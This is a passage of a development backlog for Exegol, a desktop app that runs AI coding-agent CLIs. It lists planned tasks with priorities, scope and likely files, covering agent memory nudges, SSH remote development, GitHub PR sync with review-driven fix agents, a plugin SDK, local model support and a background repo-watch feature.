**Priority**: P1-P2 (small, high-leverage — natural follow-up to the verified MCP loop) | **Effort**: S-M | **Source**: Antonio's question ("que el agente recuerde usar la memoria solo") + `RESEARCH/ENGRAM_2026_08.md` (5-layer habit stack) + `RESEARCH/TRINITY_2026_08.md` (platform_prompt_service: composed runtime-aware protocol-teacher block per spawn — production reference)

**Why**
- The MCP memory loop works (verified 2026-08-11) but agents only use it when told.
  engram proves the fix is environmental: saturate the session with triggers, nudges and
  contracts — no auto-capture, the model does every save, but it never forgets to.

**Scope (adapted to Exegol's architecture — main-process logic, no bash hooks)**
1. **MCP server instructions**: add the PROACTIVE SAVE RULE + search-first triggers to our
   server's instruction surface (shim initialize response / tool descriptions)
2. **Spawn-context protocol block**: trigger list ("user confirms/rejects an approach →
   memory_save"), self-check line, "memory_list at task start", session-summary-before-done
   — appended to the existing memory injection in `buildSpawnContext`
3. **Declarative per-provider instruction registry** (engram agents.go model): canonical
   protocol + per-CLI native rules-file target written as a managed block (reuse T140
   writer) — covers hook-less CLIs (gemini/agy/opencode/devin)
4. **Turn-boundary save nudge**: main process tracks last memory_save per agent; if session
   >5min and no save >15min, inject a one-line reminder at the next Stop signal (T123),
   15-min cooldown debounce
5. Memory store upgrades (can split): `topic_key` upsert slots + save-time conflict
   surfacing with agent-as-judge (`judgment_required` → `memory_judge`, ask-user threshold)

**Likely files**
- `main/mcp/{exegol-protocol,exegol-tools,exegol-mcp-shim-bin}.ts`, `main/agents/spawn-context.ts`,
  `main/agents/agent-session-callbacks.ts` (nudge on Stop), `main/knowledge/managed-block.ts`,
  `main/memory/store.ts` (+migration for topic_key/relations)

---

### T58 — Runtime Permission Modes (remaining delta) `added: 2026-04-01`
**Priority**: P2 | **Effort**: S | **Source**: Anvil

Core shipped in v0.4.3 (types, spawn injection, modal selector, badge, pipeline propagation — archived in `TASK_COMPLETED/2604.md`). Remaining:
- Runtime mode switching (change mode while agent is running)
- Scheduler task `accessMode` propagation
- New consumer: T145 MCP tool-set gating reads this mode

**Likely files**
- `apps/desktop/src/main/agents/*`
- `apps/desktop/src/main/pipeline/*`
- `apps/desktop/src/renderer/components/agents/SpawnAgentModal.tsx`
- `apps/desktop/src/renderer/components/terminal/*`

---

### T60 — Project Hook Scripts (remaining delta) `added: 2026-04-01`
**Priority**: P3 | **Effort**: S | **Source**: Orca + Emdash

⚠️ **Mostly superseded by shipped T91** (`.exegol/lifecycle.yaml`: `setup`, `beforeAgent`, `afterCommit`, `teardown`). Remaining delta only:
- `archive` hook fired on worktree archival (T91 has no archival-specific hook)
- Env vars in hooks: `EXEGOL_ROOT_PATH`, `EXEGOL_WORKTREE_PATH`, `EXEGOL_BRANCH`, `EXEGOL_AGENT_ID`
- Decision: fold into `lifecycle/loader.ts` or drop

**Likely files**
- `apps/desktop/src/main/lifecycle/loader.ts`

---

### T71 — Issue Tracker Expansion (Linear / Jira) `added: 2026-04-15`
**Priority**: P2 | **Effort**: Medium | **Source**: Emdash

**Why**
- GitHub Issues is a good start, but adoption expands if task ingest is not GitHub-only.

**Scope**
- Add Linear and Jira task import/create flows
- Convert ticket into task/prompt/agent assignment
- Link review outcome or PR back to source ticket

**Likely files**
- `apps/desktop/src/main/ipc/procedures/github.ts`
- `apps/desktop/src/main/ipc/*`
- `apps/desktop/src/renderer/components/workspace/sections/TasksSection.tsx`

---

### T73 — SSH Remote Development `added: 2026-04-15`
**Priority**: P3 | **Effort**: High | **Source**: Emdash + Orca (stablyai/orca)

**Why**
- High upside, but too large to mix into the current release-critical wave.
- Orca already ships SSH with a clean provider dispatch pattern worth following.

**Scope**
- Remote project registration via SSH
- PTY over SSH with reconnect/persistence strategy
- Remote git/worktree operations
- Credentials in OS keychain

**Architecture reference — Orca's provider dispatch pattern**
Orca (stablyai/orca) implements SSH via parallel provider pairs in `src/main/providers/`:
```
local-pty-provider.ts    ←→  ssh-pty-provider.ts
(local git via runner.ts) ←→  ssh-git-provider.ts
(local fs)                ←→  ssh-filesystem-provider.ts
```
Each operation (spawn PTY, run git command, read/write files) has a local and SSH variant
behind a dispatch layer (`provider-dispatch.ts`). The dispatch routes based on project
location (local path vs ssh://host). Key files to study:
- `ssh-pty-provider.ts` — PTY sessions over SSH with shell-ready detection
- `ssh-git-provider.ts` — git commands tunneled through SSH
- `ssh-filesystem-dispatch.ts` — file read/write routing

**Recommended approach for Exegol:**
1. Create `apps/desktop/src/main/providers/` with `types.ts` defining `PtyProvider`, `GitProvider`, `FsProvider` interfaces
2. Extract current local implementations as `local-pty-provider.ts`, `local-git-provider.ts`
3. Add SSH variants that implement the same interfaces
4. Dispatch layer reads project config (`project.remote?: { host, user, path }`)
5. Agent spawn flow calls provider.createPty() instead of hardcoded local PTY

**Likely files**
- New: `apps/desktop/src/main/providers/*` (dispatch + local/SSH provider pairs)
- `apps/desktop/src/main/agents/manager.ts` (spawn via provider dispatch)
- `apps/desktop/src/main/terminal/pty-sidecar-client.ts` (local PTY → provider interface)
- `packages/core-rust/src/git/` (local git → provider interface)
- Project model and settings (remote SSH config)

---

## Post-launch Backlog — Inspired by Competitors

### T92 — Cross-repo Workspaces `added: 2026-04-15`
**Priority**: P3 | **Effort**: Large | **Source**: Superconductor

**Why**
- Multi-repo projects (frontend + backend + infra) are extremely common. Users
  today open 3 Exegol windows or switch projects constantly. Sharing a workspace
  across repos with coordinated branches would be a significant differentiator.

**Scope**
- Allow a workspace tab to bind to N projects instead of 1
- Branch coordination: when creating a branch in repo A, offer to create the same
  named branch in repo B, C
- Shared agent context: an agent spawned in this workspace can have working paths
  in all bound repos
- Cross-repo diff view: single diff screen showing changes across repos
- Requires significant refactor of workspace store + ProjectContext

**Likely files**
- `apps/desktop/src/renderer/stores/workspace.ts` (multi-project binding)
- `apps/desktop/src/renderer/contexts/ProjectContext.tsx`
- `apps/desktop/src/main/agents/manager.ts` (multi-cwd agent)
- `apps/desktop/src/renderer/components/workspace/GitPane.tsx` (cross-repo diff)

---

### T93 — Mobile Companion App `added: 2026-04-15`
**Priority**: P3 | **Effort**: Very large | **Source**: Paseo Expo client

**Why**
- Long-running agents benefit enormously from remote monitoring: get notified on
  the phone when an agent enters `waiting_input`, approve/deny, read scrollback.
  This is Paseo's killer differentiator.
- Requires T94 (daemon mode) as prerequisite.

**Scope**
- New Expo/React Native app in `apps/mobile/`
- Connects to daemon via WebSocket + auth token (QR code pairing)
- v1: read-only — list agents, status, read ring buffer, push notifications
- v1.1: approve waiting_input, send one-line prompts, kill agents
- v2: full terminal view via a terminal emulator library

**Likely files**
- New: `apps/mobile/` (entire new Expo app)
- `apps/desktop/src/main/daemon/ws-server.ts` (WebSocket transport for mobile)
- `apps/desktop/src/main/security/pairing.ts` (QR token exchange)

---

### T94 — Headless Daemon Mode `added: 2026-04-15`
**Priority**: P3 | **Effort**: Large | **Source**: Paseo daemon architecture

**Why**
- Prerequisite for T93 (mobile) and a valuable standalone feature: run Exegol
  on a server/VPS and connect from anywhere. Enables CI-style agent pipelines
  without keeping the desktop app open.

**Scope**
- Extract the sidecar + DB + agent manager into a standalone daemon that runs
  without Electron (pure Node)
- Expose the existing tRPC router over WebSocket in addition to IPC
- Auth: token-based, stored in OS keychain for desktop client, in user file for
  mobile/CLI
- Desktop app becomes "a thin client to the daemon" by default, can still run
  embedded daemon for local use
- CLI (T89) also benefits from remote connection mode

**Likely files**
- New: `apps/daemon/` (standalone daemon bundle)
- `apps/desktop/src/main/ipc/router.ts` (WebSocket transport)
- `apps/desktop/src/main/security/keystore.ts` (daemon tokens)
- `packages/shared/src/transport/*` (shared ws protocol)

---

### T97 — Panel Plugin SDK `added: 2026-04-15`
**Priority**: P3 | **Effort**: Very large (2-4 weeks) | **Source**: kcosr/assistant

**Why**
- This is the single biggest architectural evolution Exegol could make for community
  growth. Today every workspace section (Tasks, Prompts, Memory, Pipelines,
  Resources, Scoring) is a hardcoded React component. Adding a new panel requires
  editing core code. kcosr/assistant proves the plugin model works: a manifest.json
  + server.js + bundle.js + auto-generated CLI — drop it in a directory and the app
  discovers it at runtime.
- Exegol becomes a **platform** instead of a **product**: community members build
  panels for Jira integration, Notion sync, custom dashboards, etc. without PRs.
- Pairs naturally with T89 (CLI): each plugin's operations become CLI commands
  automatically, just like kcosr/assistant's SKILL.md + bin/<plugin>-cli pattern.

**Scope (exploratory — needs a design spike first)**
- Define a `PluginManifest` JSON schema:
  - `id`, `name`, `version`, `description`
  - `panels`: list of `{ id, label, icon, bundlePath }`
  - `operations`: list of tool/HTTP/CLI operations the plugin exposes
  - `serverModule`: optional Node.js entry point for backend logic
  - `permissions`: what IPC/tRPC procedures the plugin can call
- Plugin discovery at startup: scan `~/.exegol/plugins/` + bundled official plugins
- **Backend host**: load server modules into sandboxed contexts in the main process,
  expose their operations as tRPC sub-routers
- **Frontend loader**: dynamic `<script>` loader + global panel registry API
  (similar to kcosr's `registerPanel()`)
- **Panel chrome**: iframe or React lazy + dynamic import per panel, with a host
  API object (state persistence, IPC to backend, session context)
- **Official plugins migration**: gradually extract Tasks, Prompts, Memory, etc. into
  `packages/plugins/official/` following the same contract, so they serve as
  reference implementations
- **CLI generation**: for each plugin operation, emit a CLI binding in `packages/cli/`
  (if T89 lands first) or a generated standalone script

**Design constraints**
- Security: plugins must not access the full main process — sandboxed IPC only
- Bundle impact: panel bundles loaded on demand (lazy), not in the initial chunk
- Backward compat: existing users who never install plugins see zero difference
- DX: `exegol plugin create <name>` scaffolds a hello-world plugin with manifest +
  server + panel

**Likely files (new)**
- New: `packages/plugin-sdk/` (manifest schema, host API types, panel protocol)
- New: `apps/desktop/src/main/plugins/host.ts` (discovery, loader, sandbox)
- New: `apps/desktop/src/main/plugins/registry.ts` (operation → tRPC bridge)
- New: `apps/desktop/src/renderer/lib/plugin-loader.ts` (dynamic panel loading)
- Modified: `apps/desktop/src/renderer/components/workspace/WorkspaceView.tsx`
  (render plugin panels alongside built-in sections)

---

## Wave 2 Backlog — Competitive Review 2026-07

> Source analysis: `docs/RESEARCH/COMPETITIVE_REVIEW_2026_07.md`. Repos studied live in
> `~/dPeluCheData/PROJECTS/dPeluChe/_code_/_repos_2_learn/github.com/`.


---


### T142 — Integrations Hub: GitHub API first `added: 2026-07-04`
**Priority**: P1 | **Effort**: M | **Source**: original idea (Antonio) + emdash (11 tracker integrations validate demand); extends T71 · **reference implementation study: `RESEARCH/TERRAGON_OSS_2026_07.md`** (github_pr snapshot schema, pure derivation helpers, dirty-check→push refresh, review-comment→fix-agent prompt recipe, one-agent-per-PR debounce, one-line "Fix CI", PR idempotency — plus what NOT to copy: webhooks/App auth; poll with `gh` token + ETag/GraphQL instead)

**Why**
- Today PR state comes from `gh` CLI (Smart Git Button). A token-based GitHub API integration (Integrations section, not GitHub-exclusive) removes the gh dependency and unlocks the real prize: **closing the review loop** — PR review comments flow back into Exegol and can spawn a fix agent.
- Relating PRs ↔ projects ↔ agent runs gives us data no competitor surfaces: which agent's PRs get merged fastest, which get the most review pushback (feeds scoring).

**Scope** (patterns integrated from the terragon-oss study — file refs in the research doc)
- Settings → Integrations section: GitHub token (keystore/safeStorage), scopes documented; `gh` CLI stays as fallback. **Single identity = the user's `gh auth` login** (PR author is the human → CODEOWNERS works); NO GitHub App/webhooks (needs public endpoint)
- PR sync per project: poll + on-focus refresh **with ETag conditional requests or one GraphQL query for PR+reviews+checks** (uncached REST hits the 5k/hr limit on active repos)
- **`github_prs` table** (terragon schema near-verbatim): `repo_full_name + number UNIQUE`, status, base_ref, mergeable_state, checks_status, `agent_id` nullable (creator link never overwritten on upsert), updated_at
- **Pure derivation helpers** ported from terragon `github-api/helpers.ts`: PR status (merged/closed/draft/open), mergeable passthrough, checks aggregation (any pending→pending, any failure→failure, all success/neutral/skipped→success)
- **Dirty-check → push refresh**: fetch → compare 4 fields vs DB → write + `broadcastPRStatus` only on change (sibling of `broadcastAgentStatus`)
- **Review-comment → task → fix agent** (terragon recipe): synthetic ```diff block built from payload only (path, diff_hunk, line/side, "originally at line N"), reply-chain walk to thread root, prompt closes delegating to `gh` CLI; spawn on `pr.head.ref` in a worktree; store `source_metadata {repo, prNumber, commentId}`
- **One-agent-per-PR debounce**: batch key `{repo}:{pr}` with 60s window — N comments feed ONE agent as queued follow-ups, never N agents; reuse existing agent (unarchived first, newest)
- **"Fix CI" one-liner** wired to Smart Git Button failing-checks state: *'Fix the failing GitHub checks. Use `gh pr checks` to get the failures.'* — no CI log plumbing
- **PR idempotency + AI body maintenance**: `pulls.list({state:open, head})` exact head.ref match before create; AI `shouldUpdate` gate; always re-inject task deep-link + issue ref (reuse the Haiku key: `generatePRContent`/`updatePRContent`)
- Optional polish: model override in comment syntax (`@exegol [sonnet] fix this`)
- Architecture: `main/integrations/{registry,github/*}.ts` — registry pattern so Linear/Jira (T71) plug in later

**Likely files**
- New: `apps/desktop/src/main/integrations/*`, migration (pr_links table)
- `apps/desktop/src/main/ipc/procedures/github.ts`, `GitPane.tsx`, `SmartGitAction.tsx`, settings UI

---


### T144 — Dependency & Library Audit `added: 2026-07-04`
**Priority**: P2 | **Effort**: S-M | **Source**: internal

**Scope**
- Upgrade pass: Electron 41 → current stable, React 18 → 19 (evaluate: emdash ships 19), xterm/addons, node-pty rebuild chain, Biome, TS
- `spark audit` + `bun pm ls` review: prune unused deps, dedupe, license check pre-open-source
- **knip config** (`knip.json` with electron-vite entries: main/index, preload, renderer, pty-sidecar-entry, workspaces): raw run 2026-07 flagged 42 exports + deps but produced false positives on `export *` barrels (e.g. `listProjects` flagged while used) — needs tuned config before pruning; then delete verified-dead exports
- Bundle budget: initial chunk ≤ 1MB enforced in CI (fonts already lazy — verify), track in BENCHMARKS.md
- Rust: `cargo update` + clippy pedantic re-run; napi + memchr versions
- Baseline 2026-07 was 0 files >450 LOC. 2026-09-22: 8 files >500 LOC (`SpawnAgentModal.tsx` 689, `exegol-server.ts` 626, `AgentDashboard.tsx` 612, `migrations.ts` 590, `procedures/agents.ts` 570, `FileExplorer.tsx` 514, `WorkspacePane.tsx` 507, `exegol-mcp-config.ts` 506)
- Dead surface inventory 2026-09-22: see T185.4
- **Orphaned tRPC procedures inventory** (defined in routers, renderer never calls — review with product before deleting; some are planned-feature stubs): `projects.open`, `agents.getStatus/updateStatus/getParallelRun/cancelParallelRun/preflight`, `settings.updateModelCatalog`, `resources.portConflicts`, `apikeys.test`, `scheduler.get`, `scrollback.exists`, `skills.getEnabledForSpawn`, `mcp.callTool`, `memory.updateRelevance/getContext/extract`, `messages.conversation/markAllRead/unreadCount`, `queue.get/updateStatus`, `qa-tests.get`, `fs-search.fuzzyFind/grep`, `indexer.projectStats/startIndexing/search`
- ~~Recovery half-wiring~~ resolved 2026-07: `invalidatePane`/`getRecoveryToken`/`RecoveryToken` removed (`invalidReason` stays — set via `updatePane`, rendered in WorkspacePane); unused deps removed (`@radix-ui/react-dialog` in desktop+ui, `react-dropdown-menu` + `lucide-react` in ui)

---



### T132 — Automations Catalog `added: 2026-07-04`
**Priority**: P2 | **Effort**: S-M | **Source**: emdash `builtin-catalog.ts` + openclaw heartbeat/cron delivery

**Scope**
- Template catalog over existing `scheduler/engine`: "daily summary", "scan vulns", "add test coverage", "triage TODOs"
- Each run delivers result via NotificationBus (T124); suppress empty results
- One-click enable from a catalog UI in Project → Tasks

### T133 — Remote Notification Channel (Telegram first) `added: 2026-07-04`
**Priority**: P2 | **Effort**: M | **Depends**: T124
- Telegram bot channel implementing the same `deliver()` interface; allowlist of chat ids; optional reply→prompt injection later. Validated demand: Orca mobile app, AgentsRoom.

### T134 — ACP Boundary (experimental) `added: 2026-07-04`
**Priority**: P2 | **Effort**: L | **Source**: emdash `packages/core/src/acp/`, t3code `effect-acp`, Zed ACP
- Agent Client Protocol (JSON-RPC/stdio) for one provider (Claude Code or Gemini) in an experimental pane; structured events instead of PTY scraping; PTY remains default. Evaluate before committing to boundary refactor.

### T135 — Derived Status + CDC change_log `added: 2026-07-04`
**Priority**: P2 | **Effort**: M | **Source**: ComposioHQ/agent-orchestrator (OBSERVE→UPDATE→DERIVE)
- Persist only durable facts (`activity_state`, `is_terminated`); derive display status read-time by precedence. `change_log` table (SQLite triggers) with seq watermark → renderer reconnects without gaps. Kills stale-status bug class.

### T136 — Tiered Merge Resolver `added: 2026-07-04`
**Priority**: P2 | **Effort**: M | **Source**: overstory merge queue + clash (worktree conflict detection)
- For parallel runs/pipelines: (1) clean merge → (2) keep-incoming → (3) AI-resolve → (4) reimplement-from-spec. Auto-commit runtime state files (`.claude/`, etc.) so they never block merges.
- **Proactive overlap detection**: warn when 2+ active worktrees touch the same files *before* merge time (cheap: compare `git status` paths across worktrees on a timer / on turn end).

### T137 — Hunk Assignment + Absorb (GitPane) `added: 2026-07-04`
**Priority**: P2 | **Effort**: M-L | **Source**: GitButler `but-hunk-assignment` + `absorb.rs`
- Stable hunk UUIDs surviving edits → attribute uncommitted hunks to agents/branches; "absorb" redistributes agent fixups to the right commits.

### T138 — ModeTracker Headless `added: 2026-07-04`
**Priority**: P2 | **Effort**: S | **Source**: superset `terminal-mode-tracker.ts` (VSCode XtermSerializer lineage)
- A `HeadlessEmulator` exists (`main/terminal/headless-emulator.ts`) but reads modes with a per-write regex: a bracketed-paste sequence split across two writes leaves the mode off, and multi-mode `;` sequences fail (review 2026-09-05 #8). Track modes through the xterm parser, serialize only after the parser drained. Acceptance: splitting any supported sequence at any position gives the same final state.

### T139 — Skills Security Scan (pre-import) `added: 2026-07-04`
**Priority**: P2 | **Effort**: S-M | **Source**: mission-control Skills Hub scanner
- Pattern gate before installing external skills/MCP configs: prompt-injection, credential exfil, dangerous shell, obfuscation. Blocks write-to-disk on match; user override with warning.

---


## Terax Review — Stack Optimizations (Wave 1)

> Source: `docs/RESEARCH/TERAX_STACK_REVIEW.md` (Terax-AI vs Exegol comparison, 2026-05-21).
> All tasks below cite specific Terax files when copying patterns.
> Strategic stance: keep AI-spawned CLI as our core; adopt Terax's tighter implementation patterns.

### T114 — xterm Renderer Pool `added: 2026-04-15`
**Priority**: Wave 1 / P3 | **Effort**: L | **Source**: Terax `src/modules/terminal/lib/rendererPool.ts:1-700`

**Why**
- Today: 1 xterm instance per pane = 1 WebGL context per pane. 10+ tabs saturates GPU and balloons memory.
- Terax keeps ≤5 active slots in a pool; hidden tabs release their slot after snapshotting screen + push live ring into DormantRing (T115).
- When the tab returns: pick best slot (LRU, deprioritize alt-screen + focused), reset, write snapshot, replay ring. For alt-screen TUIs (vim, htop): discard ring, force SIGWINCH "kick".

**Scope**
- Lift `rendererPool.ts` into `apps/desktop/src/renderer/lib/terminal-pool.ts`.
- Replace `TerminalInstance` with `usePooledTerminal(paneId, container)` hook.
- Permanent off-screen recycler div (`position: fixed; left: -99999px; contain: strict`).
- Wire `WorkspacePane` so hidden panes release the slot instead of unmounting.
- Floating PiP (T84) integration: ensure snapshot/replay works when a pane detaches.
- WebGL context-loss recovery (already in T113, adapt for pool).

**Depends on**
- T115 (DormantRing) shipped (`renderer/lib/dormant-ring.ts`); T178 already stops sending bytes to hidden panes. Measure before building.

**Risk**
- Our sidecar ring already provides instant reconnect; pool's value is only above ~5 concurrent tabs.
- Cross-cuts Workspace, FloatingPaneRoot, ring-buffer reattach, snapshot replay.

**Likely files**
- `apps/desktop/src/renderer/lib/terminal-pool.ts` (new)
- `apps/desktop/src/renderer/components/terminal/TerminalInstance.tsx` (replaced or wrapped)
- `apps/desktop/src/renderer/components/workspace/WorkspacePane.tsx`
- `apps/desktop/src/renderer/FloatingPaneRoot.tsx`

---

### T122 — Vercel AI SDK + Ollama Support `added: 2026-04-15`
**Priority**: Wave 1 / P3 (radar) | **Effort**: M | **Source**: Terax `src/modules/ai/lib/agent.ts:70-211` + `transport.ts:71-114`

**Why**
- Today our direct LLM calls (commit msg `diff-ai.ts:53`, Tier-3 judge `scoring.ts:239`, evaluator, evidence) go through `lib/anthropic.ts#callAnthropicMessage` (withRetry since T150). Still missing: cache breakpoints, provider choice, schema-validated output (regex parse; see T192).
- Vercel AI SDK v6 gives us all of that + provider-agnostic API. Unlocks **Ollama / LM Studio / local models** via `@ai-sdk/openai-compatible` with a single abstraction.
- Not vital for our spawned-CLI core — keep on radar but value compounds if we add more in-process LLM utilities.

**Scope**
- Add deps: `ai`, `@ai-sdk/anthropic`, `@ai-sdk/openai-compatible` (for Ollama/LM Studio).
- New `apps/desktop/src/main/ai/llm.ts`:
  - `getAnthropic(db)`: pulls key from `keystore`, returns `LanguageModel`.
  - `getOllama(baseUrl)`: returns local OpenAI-compatible model.
  - `applyCacheBreakpoints(messages)`: helper porting Terax's `agent.ts:294-311` pattern.
- Refactor `diff-ai.ts`:
  - `generateText({ model, prompt, maxOutputTokens: 120, abortSignal })` instead of fetch.
- Refactor `scoring.ts:210-280`:
  - `generateObject({ model, schema: z.object({ clarity: z.number().min(1).max(5), ... }) })` — replaces regex parse on `text.match(/\{[^}]+\}/)`.
  - Apply cache breakpoints for ~30–50 % cost reduction across Tier-3 evaluations.
- Settings UI: new "Local Models" section under API Keys for Ollama base URL + model picker.
- **Anti-pattern reminder**: do NOT add separate code branches for Ollama / LM Studio / MLX. Single OpenAI-compatible abstraction with base-URL + name + key + headers config.

**Likely files**
- `apps/desktop/package.json`
- `apps/desktop/src/main/ai/llm.ts` (new)
- `apps/desktop/src/main/lib/anthropic.ts`, `ipc/procedures/diff-ai.ts`
- `apps/desktop/src/main/agents/scoring.ts`
- `apps/desktop/src/renderer/components/settings/ApiKeysSettings.tsx` (Ollama config)

---


---

## Wave 3 candidate — Owl / Fleet Watch `added: 2026-07-28`

> **Definition**: `docs/ARCHITECTURE/OWL_FLEET_WATCH.md` (agreed 2026-07-28). Owl is a
> NATIVE Exegol feature: background fleet-watch over registered repos, surfacing what
> Antonio has NOT seen/reviewed (attention tracking), consumed by the UI and by external
> Claude sessions via the existing MCP layer. Deferred until Wave 2.6 (hardening) closes.
> Salvage source: `_code_/_archive_/labs-cli-proman`.
> IDs renumbered 2026-09-22 (were T156/T157/T158/T160, which collided with the dashboard,
> messaging, memory-habit and alias tasks): T186, T187, T188, T189. T159 unchanged.
> Runtime conflict to settle before building: T153 wants a `llama-server` sidecar, T159 an
> in-process backend.

### T186 — Owl Phase 1: Collectors + store + raw digest `P2`
**Why**: kills the manual "¿qué no he visto?" scan across active repos; useful with zero LLM.
**Scope**: port cli-proman collector commands (`status`, `git-status`, `wip`, `blocked`,
`review`, `next`...) as deterministic per-repo collectors → facts JSON; scheduler
(interval/on-wake) over registered repos (start: henri ×2, walter ×2, skysset,
dpeluche.dev); store in SQLite with per-item seen/unseen marks; raw digest view in UI.
Owl is read-only toward repos — writes only to its own store.

### T187 — Owl Phase 2: Small-model synthesis via InferenceProvider `P2` (depends: T186, T122)
**Why**: turn facts into notable-or-noise + priority + 1-2 line summaries; seen items go
quiet, unseen insist.
**Scope**: generative small model (start Qwen3 4B; SmolLM3-3B/Gemma 3 4B interchangeable)
through the T122 abstraction with Ollama backend — the LLM only ever sees structured facts,
never raw diffs. Every digest line carries verifiable facts (SHA, PR#, timestamp). Model
bake-off happens here. Note: `nomic-embed-text` stays embeddings-only; this is a second,
generative model on the same runtime.

### T188 — Owl Phase 3: MCP exposure + digest actions `P2` (depends: T187)
**Scope**: `fleet_digest` / `repo_status` / `mark_seen` tools on `main/mcp/registry.ts`;
digest actions: create task, open session, launch review agent (only Exegol can close this
loop). External consumer #1: kickoff resume mode reading the digest instead of re-scanning.
**Runtime requirement**: the MCP server ships in the build and runs as a **headless daemon**
(`exegol watch`, launchd) — shared with T189's council/bus tools. The Electron window is a
view, not the runtime. Definition: `docs/ARCHITECTURE/COUNCIL_BASE.md`.

### T189 — Council base: structured executions + exchange bus `P2` (depends: T188)
**Definition**: `docs/ARCHITECTURE/COUNCIL_BASE.md`. Absorbs the standalone "council MCP"
project — one server, not two. NOT branded "rubber duck": cross-family review is one preset.
**Why**: (a) relay-by-hand between session agents was friction #1 of the jul-2026
conversation audit (henri front↔backend, walter client↔cloud); (b) "define prompt +
structure, get result" executions are what live sessions don't cover.
**Scope**:
- Structured executions: spawn CLIs non-interactively (`claude -p`, `codex exec`, gemini)
  with a prepared prompt/structure, run headless to completion, deliver result to the
  project store. Preset #1: cross-family review of a just-built change (return discrepancies).
- Bus tools on the same MCP server: `thread_create` / `message_post` / `message_list`
  (since-last-read) / `status_update` / `handoff_get`, project-scoped. Content comes from
  agents; the server is only the wire.
- Per-project activity view in UI: new threads · council results · owl updates, with the
  same seen/unseen marks as Owl (one feed, three producers).

### T159 — Embedded inference backend `P3` (depends: T187 proven)
**Why**: Ollama = shared server (contention) + keep_alive unload → multi-second reload each
watcher cycle. Embedded = resident, always warm, app-managed resources.
**Scope**: second `InferenceProvider` backend in-process (node-llama-cpp, or llama.cpp via
existing Rust/napi); GGUF download management; single-flight queue with priorities
(interactive UI > background digest); ~2.5–3 GB RAM budget for 4B Q4. Backend swap must be
config, not rewrite (TERAX rule: ONE abstraction, not 4 cases).

---

## Distribution (pending GitHub)

### T45 — CI/CD Release Pipeline `added: 2026-04-15`
**Priority**: P3 | Validation CI shipped (`.github/workflows/ci.yml`, PR #115). Remaining: tag-triggered
package + release workflow, signing secrets (see `GUIDES/RELEASE.md`).

### T46 — Canary Channel `added: 2026-04-15`
**Priority**: P3

